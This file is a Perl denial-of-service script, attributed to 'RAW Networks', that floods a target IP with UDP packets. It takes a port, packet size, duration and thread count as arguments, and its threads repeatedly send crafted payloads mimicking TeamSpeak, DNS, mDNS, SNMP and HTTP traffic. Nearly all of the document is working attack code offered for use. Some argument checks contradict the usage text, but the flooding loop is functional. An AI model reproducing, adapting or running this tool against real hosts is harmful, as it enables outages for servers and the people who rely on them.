#!/usr/bin/perl -w

use strict;
use Socket;
use threads;



my $fail = 0;
#Script by RAW Networks
#YouTube: https://github.com/Blackyraw
#Usage: [IP] [port 0 for random]  [Packet size 0 for random [1-65500]] [seconds to flood] [threads] [show each packet sent, 0 for false 1 for true]
if($ARGV[0] =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)
{
    print "[x]Valid IP check...\n"
}
else
{
    $fail = 1;
    print "[!]IP check Failed... x.x.x.x\n";  
}
if($ARGV[1] =~ /^\d+$/ && $ARGV[1] > 0 && $ARGV[1] < 65536)
{
    print "[x]Port Check...\n";
}
else
{
    $fail = 1;
    print "[!]Port Check Failed! 0 for random or 1-65535...\n";  
}
if($ARGV[2] =~ /^\d+$/ && $ARGV[2] > 0 && $ARGV[2] <= 65500)
{
    print "[x]Packet Size Check...\n";
}
else
{
    $fail = 1;
    print "[!]Packet Size Check Failed! 0 for random - 65500...\n";  
}
if($ARGV[3] =~ /^\d+$/ && $ARGV[3] > 0)
{
    print "[x]Valid Seconds check...\n"
}
else
{
    $fail = 1;
    print "[!]Seconds check Failed... must be an interger and greater then 0\n";  
}
if($ARGV[4] =~ /^\d+$/ && $ARGV[4] > 0)
{
    print "[x]Valid Threads check...\n";
    if($ARGV[4] > 35)
    {
        print "Warning! You have selected 35+ threads. This can cause problems, consider revising!\n";
    }
}
else
{
    $fail = 1;
    print "[!]Threads check Failed... must be an interger and greater then 0\n";  
}
if($ARGV[5] =~ /(0|1)/)
{
    print "[x]Valid \"Show Each Packet\" variable...\n";
}
else
{
    $fail = 1;
    print "[!]Invalid \"Show Each Packet\" variable 0 for no, 1 for yes...\n";
}


if($fail == 0)
{
#print "Continue?[y/n]\n";
#my $ans = <STDIN>;
#if($ans =~ /y/i)
{
    print "[UDP Flooding] $ARGV[0] " . "| PORT:" . ($ARGV[1] ? $ARGV[1] : "random")
    . " PacketSize:" . ($ARGV[2] ? "$ARGV[2]-byte" : "random") . " Seconds:$ARGV[3]"
    . " Threads:$ARGV[4]\n";

    use vars qw ($udp_tdn $p_s $udp_t $count $udp_td $d_c $d_cc);

    $udp_td = 0, $count = 0;

    for(; $count <= $ARGV[4]; $count += 1)
    {
        $udp_t = threads->create(\&udpflood, $ARGV[0], $ARGV[1], $ARGV[2], $ARGV[3], $ARGV[4]);
        print "Thread:$count\n";
    }

    $d_c = threads->create(\&udpdone);

    $d_cc = $d_c->join();

    for(;$d_c == 0;)
    {
        sleep(3);
    }
  
sub udpflood
{
    my $ip = $_[0], my $port = $_[1] ,my $size = $_[2] ,my $time = $_[3], my $threads = $_[4];
    my ($iaddr,$endtime,$psize,$pport);
    $iaddr = inet_aton("$ip");
    $endtime = time() + ($time ? $time : 1000000);
    socket("flood", PF_INET, SOCK_DGRAM, 17);
    for (;time() <= $endtime;)
    {
        $psize = $size ? $size : int(rand(8000-64)+64) ;
        $pport = $port ? $port : int(rand(65500))+1;
    send("flood", pack("a$psize","\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\xba\x2a\xc3\x4a\xc4\xd9\x84\xfc\x00\x00\x00\x00\x22\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x6d\x64\xf1\x95\xd3\xd2\x1e\x79\xd2\xe4\xca\x03\x2f\x69\xfc\x95\x3e\x71\x02\x9f\x29\x1a\x2d\xc2\x46\xf2\x15\xf4\xf1\x6b\xe7\x7e\xd0\x6a\x70\x99\xaa\x46\xa6\x4c\x77\x80\x39\x7a\x11\x16\xce\x96\x3e\xd7\x73\xa5\xfd\x07\x87\xed\x21\xbc\xc3\x61\x0a\x92\xaf\x7c\x7d\x47\x54\x9f\x00\x22\xce\xf6\x13\x27\xde\xda\x7b\xe2\x5a\x88\x9b\xed\x2d\xd6\x0f\xad\x7f\x5b\x6b\x2d\x97\xa0\xc1\x1d\x0b\x44\x2b\x02\xb7\x19\xa8\xd1\xeb\x26\xf2\xba\x49\xa1\xd9\xd0\x03\x3b\xbe\x2e\x2f\xfa\xf6\x23\x0a\xed\x89\xba\x93\x8c\xae\x8b\x0c\x56\xfe\x83\xf1\x25\xc3\x11\x84\x18\x90\xf5\xe4\xe7\x47\x3e\xa4\x31\x9a\x28\x68\x5c\x93\x91\x85"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x32\x78\xba\x85\x09\x54\x65\x61\x6d\x53\x70\x65\x61\x6b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x57\x69\x6e\x64\x6f\x77\x73\x20\x58\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x20\x00\x3c\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x6e\x69\x63\x6b\x6e\x61\x6d\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x16\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","0xFFFFFFFF"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","POST /login.tscmd HTTP/1.1\r\n"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","it-it,it;q=0.8,en-us;q=0.5,en;q=0.3\r\n"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","/slogin.html\r\n"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","application/x-www-form-urlencoded\r\n"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","ts3server://"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\r12345678Q999\x00"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x00\x02\x00\x2f"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","ABCDEFGIHIJKSSLMNO8"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","0/1//0///1//7//9////5"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x00\x02\xf1\x26\x01\x26\xf0\x90\xa6\xf0\x26\x57\x4e\xac\xa0\xec\xf8\x68\xe4\x8d\x21"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\xff\xff\x55\x13"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","udp://"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","raw://"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","0day"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","xFF0"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","connect://"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","ping://"), 0, pack_sockaddr_in($pport, $iaddr));
	send("flood", pack("a$psize","request://"), 0, pack_sockaddr_in($pport, $iaddr));
        if($ARGV[5]==1)
        {
           
        }
    }
      
    return 0;
}
sub udpdone
{
    $udp_td = $udp_t->join();
    while ($udp_td == 0)
    {
    sleep(1);
    }
    print "[UDP Flooding]:Flood Done!\n";
    return 0;
}
}
}


